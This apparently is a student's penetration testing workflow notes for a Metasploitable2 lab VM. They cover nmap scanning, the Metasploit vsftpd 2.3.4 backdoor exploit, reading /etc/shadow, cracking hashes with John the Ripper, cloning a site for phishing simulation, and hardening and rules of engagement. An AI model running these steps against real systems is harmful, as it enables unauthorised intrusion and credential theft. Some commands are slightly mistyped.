Task4: Learn penetration testing workflow and exploit vulnerabilities responsibly.


---

## 1. Penetration Testing Methodology
Phases: Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting. Follow a structured approach, document every step (commands, outputs, timestamps), and only test systems you are authorized to assess.

---

## 2. Phase 1 — Reconnaissance (Passive)
**Goal:** Gather public information without direct interaction.
**Why:** Identifies potential entry points while minimizing noise.
**Example commands (lab):**
```
whois 192.168.10.4
dig 192.168.10.4
```

---

## 3. Phase 2 — Scanning (Active)
**Goal:** Probe the target for open ports, services, and vulnerabilities.
**Why:** Reveals exploitable weaknesses.
**Key commands:**
```
nmap -sS -sV -A 192.168.10.4
```
**Notes:** -sS = SYN scan, -sV = version detection, -A = OS & script scanning. Save raw outputs and parse for service versions (e.g., vsftpd 2.3.4).

---

## 4. Phase 3 — Exploitation (Metasploit example)
**Goal:** Exploit a known vulnerability in a lab VM (Metasploitable2) to gain access.
**Example — vsftpd 2.3.4 backdoor (lab only):**
```
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.10.4
exploit
```
If successful, you'll receive a shell.
---

## 5. Phase 4 — Post-Exploitation & Evidence Collection
**Goal:** Assess impact, collect evidence, and avoid causing damage.
**Common commands (shell/meterpreter):**
```
sessions -i l
id
whoami
Uname –a
Cat /etc/passwd
Cat /etc/shadow
```
**Evidence collection tips:**
- Save outputs to files:  `hashes.txt`.
- Cleanly exit shells with `exit` to avoid leaving active sessions.

---

## 6. Phase 5 — Reporting & Deliverables
Include:
- Executive summary for stakeholders
- Technical findings with proof (screenshots, logs)
- Risk rating (Low/Medium/High/Critical)
- Remediation recommendations and timeline
- Appendix with raw command outputs (phase1_recon.txt, nmap_scan_results.txt, msf_session.txt)

  Sample findings table (example):
| Finding | Evidence | Risk | Recommendation |
|---|---:|---:|---|
| Open FTP (vsftpd 2.3.4) | nmap + banner | High | Upgrade vsftpd / disable service / restrict access |
| Outdated Apache modules | nikto | Medium | Update modules / add WAF |
| Weak SSH config | ssh banner | Medium | Enforce key auth / disable root login |

---
## 7. Password Attacks (John the Ripper)
**Crack hashes with John the Ripper:**
Save hashes from `hashdump` to `hashes.txt` then:
```
john hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## 8. Social Engineering (Simulation Only)
**Goal:** Raise awareness using simulated phishing (no real victims).
**Tools:** Built a python tool for phishing url Detection.
**Quick flow:** Clone target site with SET → host locally (`python3 -m http.server 8000`) → use for awareness exercises only.
**Ethics:** Never send real phishing emails. Use simulations and training materials only.

## 9. Malware Basics (Benign Analysis)
**Static analysis:** use `strings`, `file`, and disassembly tools on benign samples.
**Dynamic analysis:** run in sandbox (Cuckoo Sandbox) or isolated VM; submit benign files and observe behavior.


---

## 10. System Hardening & Mitigations
**Open FTP (vsftpd 2.3.4):**
```bash
sudo apt update && sudo apt install --only-upgrade vsftpd
sudo systemctl disable --now vsftpd
sudo ufw deny 21/tcp
```
**SSH improvements:**
```bash
sudo sed -i 's/^PermitRootLogin\s.*/PermitRootLogin no/' /etc/ssh/sshd_config
sudo sed -i 's/^PasswordAuthentication\s.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo systemctl restart sshd
```
**Web hardening:** Keep packages updated, disable unused modules (`sudo a2dismod <module>`), deploy WAF (ModSecurity).

---
## 11. Safety, Ethics & Rules of Engagement (RoE)
- Always obtain written authorization before testing non-owned systems.
- Do not perform destructive actions (deletion, ransomware, pivoting to production systems).
- Preserve evidence and minimize impact; prefer read-only collection.
- Document timestamps and chain of custody for artifacts.
- If uncertain, stop and get written clarification from the owner.
  

